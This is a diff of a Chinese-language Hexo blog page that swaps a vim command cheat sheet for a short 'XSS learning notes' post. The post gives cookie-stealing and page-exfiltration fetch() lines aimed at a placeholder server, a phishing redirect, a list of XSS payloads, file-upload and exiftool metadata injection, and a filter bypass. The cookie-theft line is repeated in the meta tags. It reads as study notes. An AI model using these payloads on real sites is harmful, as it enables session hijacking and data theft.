@@ -3,33 +3,31 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>vim基础使用 - MINX&#39;s Blog</title>
+  <title>XSS学习笔记 - MINX&#39;s Blog</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png">
-  <meta name="description" content="参考：https://www.cnblogs.com/Jimc/p/10213914.html（可以说是照搬吧，只是写给自己忘记的时候看看）">
+  <meta name="description" content="利用方法 最主要的利用方式即是将Cookie发送到自己服务器上：fetch(&amp;#39;//YOUR_SERVER/?c=&amp;#39; + encodeURIComponent(document.cookie)) 当Cookie无法读取时，跳转到钓鱼页面location.href = &amp;#39;YOUR_FISHING_WEBPAGE’ 想知道后台HTML长什么样的时候（利用POST传输数据）fe">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vim基础使用">
-<meta property="og:url" content="http://iminx.cn/2019/10/31/vim基础使用/index.html">
+<meta property="og:title" content="XSS学习笔记">
+<meta property="og:url" content="http://iminx.cn/2020/02/15/XSS学习笔记/index.html">
 <meta property="og:site_name" content="MINX&#39;s Blog">
-<meta property="og:description" content="参考：https://www.cnblogs.com/Jimc/p/10213914.html（可以说是照搬吧，只是写给自己忘记的时候看看）">
+<meta property="og:description" content="利用方法 最主要的利用方式即是将Cookie发送到自己服务器上：fetch(&amp;#39;//YOUR_SERVER/?c=&amp;#39; + encodeURIComponent(document.cookie)) 当Cookie无法读取时，跳转到钓鱼页面location.href = &amp;#39;YOUR_FISHING_WEBPAGE’ 想知道后台HTML长什么样的时候（利用POST传输数据）fe">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/vim%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1.png">
-<meta property="og:updated_time" content="2020-01-29T12:11:20.985Z">
+<meta property="og:updated_time" content="2020-02-29T02:10:34.156Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="vim基础使用">
-<meta name="twitter:description" content="参考：https://www.cnblogs.com/Jimc/p/10213914.html（可以说是照搬吧，只是写给自己忘记的时候看看）">
-<meta name="twitter:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/vim%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1.png">
+<meta name="twitter:title" content="XSS学习笔记">
+<meta name="twitter:description" content="利用方法 最主要的利用方式即是将Cookie发送到自己服务器上：fetch(&amp;#39;//YOUR_SERVER/?c=&amp;#39; + encodeURIComponent(document.cookie)) 当Cookie无法读取时，跳转到钓鱼页面location.href = &amp;#39;YOUR_FISHING_WEBPAGE’ 想知道后台HTML长什么样的时候（利用POST传输数据）fe">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1584554069554">
+  <link rel="stylesheet" href="/css/style.css?v=1584554069669">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -141,65 +139,53 @@
         <div class="nexmoe-post">
     <div class="nexmoe-post-cover"> 
         
-        <img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/1.jpg">
+        <img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/10.jpg">
         
-        <h1>vim基础使用</h1>
+        <h1>XSS学习笔记</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月31日</a>
-    <a><i class="nexmoefont icon-areachart"></i>778 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2020年02月15日</a>
+    <a><i class="nexmoefont icon-areachart"></i>343 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 2 分钟</a>
     
-      <a class="nexmoefont icon-appstore-fill -link" href="/categories/Linux基础命令/">Linux基础命令</a>
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/Web/">Web</a>
     
     
   </div>
   <article>
-    <p>参考：<a href="https://www.cnblogs.com/Jimc/p/10213914.html" target="_blank" rel="noopener">https://www.cnblogs.com/Jimc/p/10213914.html</a><br>（可以说是照搬吧，只是写给自己忘记的时候看看）</p>
-<a id="more"></a>
+    <a id="more"></a>
 
-<h1 id="先是工作模式图"><a href="#先是工作模式图" class="headerlink" title="先是工作模式图"></a>先是工作模式图</h1><p><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/vim%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1.png" alt="vim"></p>
-<h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><p><code>vi test.txt  或者 vim test.txt 或者 touch test.txt</code></p>
-<h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><ol>
-<li>x,X                          x为向后删除一个字符，X为先前删除一个字符</li>
-<li>nx(n代表数字)                 向后删除n个字符</li>
-<li>dd                           删除当前行</li>
-<li>D                            删除当前行所有字符，试成为空行</li>
-<li>ndd(n代表数字)                删除光标所在行的向下n列</li>
-<li>u                            恢复前一个动作(undo)</li>
-<li>ynj(n代表数字)                复制光标所在行向下n+1行</li>
-<li>dnj(n代表数字)                删除光标所在行向下n+1行</li>
-<li>p,P                          p为复制的数据粘贴在光标的下一行，P为复制的数据粘贴在光标的上一行</li>
-<li>H                            光标移动到当前屏幕最上方的那一行的第一个非空字符</li>
-<li>L                            光标移动到当前屏幕最下方的那一行的第一个非空字符</li>
-<li>G                            光标移动到该文章最后一行的第一个非空字符</li>
-<li>Ctrl+f                       屏幕向下翻一页</li>
-<li>Ctrl+b                       屏幕向上翻一页</li>
-<li>Ctrl+d                       屏幕向下翻半页</li>
-<li>Ctrl+u                       屏幕向上翻半页</li>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><ol>
+<li>最主要的利用方式即是将Cookie发送到自己服务器上：<code>fetch(&#39;//YOUR_SERVER/?c=&#39; + encodeURIComponent(document.cookie))</code></li>
+<li>当Cookie无法读取时，跳转到钓鱼页面<br><code>location.href = &#39;YOUR_FISHING_WEBPAGE’</code></li>
+<li>想知道后台HTML长什么样的时候（利用POST传输数据）<br><code>fetch(&#39;YOUR_WEBPAGE&#39;, {method: &#39;POST&#39;, body: &#39;body=&#39; + encodeURIComponent(document.body.innerHTML), headers: {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}})</code></li>
 </ol>
-<h3 id="进入输入模式"><a href="#进入输入模式" class="headerlink" title="进入输入模式"></a>进入输入模式</h3><ol>
-<li>i,I i是在光标所在字母的后面输入。I是在光标所在行的非空字符最前面开始输入</li>
-<li>a,A a是在光标所在的字母前面一个位置开始输入，也就是输入后光标所在的字母会在输入的文字后面，A是光标所在行末尾开始输入</li>
-<li>o,O o在光标所在行下一行首开始输入，O在光标所在行上一行行首开始输入</li>
-<li>r,R r为替换光标所在的哪一个字符，R为一直替换光标所值的文字直到推出</li>
-<li>Esc 推出，回到命令模式</li>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol>
+<li>navigator.userAgent        当前的浏览器信息</li>
+<li>navigator.plugins            启用的插件（非扩展）列表</li>
+<li>location.href            当前URL</li>
+<li>document.body.innerHTML    当前页面HTML</li>
+<li>document.title            当前标题<br>（从自己服务器获取）        IP</li>
 </ol>
-<h3 id="输入-进入底部命令模式"><a href="#输入-进入底部命令模式" class="headerlink" title="输入:进入底部命令模式"></a>输入<code>:</code>进入底部命令模式</h3><ol>
-<li>/word 在光标之后找到word字符串  这时候n向下检索，N向上检索</li>
-<li>?word 在光标之前找到word字符串</li>
-<li>:s/word1/word2/g             在光标当前行查找word1，并替换成word2</li>
-<li>:n1,n2s/word1/word2/g  　　　 在第n1行与第n2行之间查找word1，并替换成word2</li>
-<li>:%s/word1/word2/g        　　 整个文章查找word1，并替换成word2</li>
-<li>:w                           将编辑的数据保存到硬盘文件中</li>
-<li>:w [filename]                将编辑后的数据保存到硬盘的另一个文件中</li>
-<li>:r [filename]                在编辑数据时，读入另一个文件中的数据，即将filename文件中的内容加到光标所在行下一行</li>
-<li>:wq或:x                      保存并退出</li>
-<li>:q                           退出，适用于未修改的文件</li>
-<li>:q!                          强制退出，适用于修改文件后不保存退出</li>
-<li>:set nu                      显示行号</li>
-<li>:set nonu                    取消行号</li>
-<li>:n1,n2 w [filename]          将n1到n2行的内容保存到名为filename的文件中</li>
+<h2 id="部分payload"><a href="#部分payload" class="headerlink" title="部分payload"></a>部分payload</h2><ol>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><code>&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></li>
+<li><code>&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</code></li>
+<li><code>&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0 Pg==&quot;&gt;&lt;/embed&gt;</code></li>
+<li><code>&lt;svg/onload=alert(1)&gt;</code></li>
+<li><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code></li>
+<li><code>&lt;textarea autofocus onfocus=&quot;alert(1)&quot;&gt;&lt;/textarea&gt;</code></li>
+<li><code>&lt;textarea onmouseover=&quot;alert(1)&quot;&gt;&lt;/textarea&gt;</code></li>
+<li><code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li><code>&lt;details open ontoggle=alert(1)&gt;</code></li>
+</ol>
+<h2 id="文件上传注入"><a href="#文件上传注入" class="headerlink" title="文件上传注入"></a>文件上传注入</h2><ol>
+<li>当文件名有回显时可以用文件名注入<code>&quot;&gt;&lt;svg onload=alert(1)&gt;.gif</code></li>
+<li>当文件的元数据有回显时，可以在命令行<code>$ exiftool -Artist=&#39;&quot;&gt;&lt;svg onload=alert(1)&gt;&#39;xss.jpeg</code>来设置任意元数据字段</li>
+<li>可以直接上传.svg文件<code>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</code></li>
+</ol>
+<h2 id="部分过滤绕过"><a href="#部分过滤绕过" class="headerlink" title="部分过滤绕过"></a>部分过滤绕过</h2><ol>
+<li><code>.</code>被过滤，如果是要访问某一个网站，可以用‘。’代替‘.’，浏览器会贴心的帮你换回去。<code>&lt;link rel=prefetch href=\\eviloh。xyz&gt;</code></li>
 </ol>
 
   </article>
@@ -208,7 +194,7 @@
 <div class="nexmoe-post-copyright">
 <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
 <strong>本文作者：</strong>MINX<br>
-<strong>本文链接：</strong><a href="http://iminx.cn/2019/10/31/vim基础使用/" title="http://iminx.cn/2019/10/31/vim基础使用/" target="_blank" rel="noopener">http://iminx.cn/2019/10/31/vim基础使用/</a><br>
+<strong>本文链接：</strong><a href="http://iminx.cn/2020/02/15/XSS学习笔记/" title="http://iminx.cn/2020/02/15/XSS学习笔记/" target="_blank" rel="noopener">http://iminx.cn/2020/02/15/XSS学习笔记/</a><br>
 
   <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可 <br> <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
 
